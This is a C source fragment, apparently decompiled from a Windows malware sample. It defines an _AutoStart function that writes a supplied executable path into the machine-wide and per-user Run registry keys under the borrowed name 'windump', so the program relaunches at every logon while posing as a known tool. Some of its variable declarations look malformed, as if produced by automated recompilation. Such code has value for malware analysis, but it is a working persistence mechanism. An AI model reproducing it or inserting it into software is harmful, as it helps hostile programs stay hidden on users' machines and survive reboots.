#include "data_globals.h"
#include <windows.h>
#include <stdint.h>
#include <string.h>

#pragma optimize("", off)
void _AutoStart(BYTE *param_1)
{
    volatile LSTATUS LVar1_buf[2] = {{0, (LSTATUS)0}};
    volatile LSTATUS *p_LVar1 = (volatile LSTATUS *)&LVar1_buf[0];

    volatile DWORD DVar2_buf[2] = {{0, (DWORD)0}};
    volatile DWORD *p_DVar2 = (volatile DWORD *)&DVar2_buf[0];

    HKEY local_10[3];

    (*p_LVar1) = RegOpenKeyExA((HKEY)0x80000002, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
                          0x20006, local_10);
    if ((*p_LVar1) == 0) {
        (*p_DVar2) = strlen((char *)param_1);
        RegSetValueExA(local_10[0], "windump", 0, REG_SZ, param_1, (*p_DVar2));
        RegCloseKey(local_10[0]);
    }
    (*p_LVar1) = RegOpenKeyExA((HKEY)0x80000001, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
                          0x20006, local_10);
    if ((*p_LVar1) == 0) {
        (*p_DVar2) = strlen((char *)param_1);
        RegSetValueExA(local_10[0], "windump", 0, REG_SZ, param_1, (*p_DVar2));
        RegCloseKey(local_10[0]);
    }
}
#pragma optimize("", on)
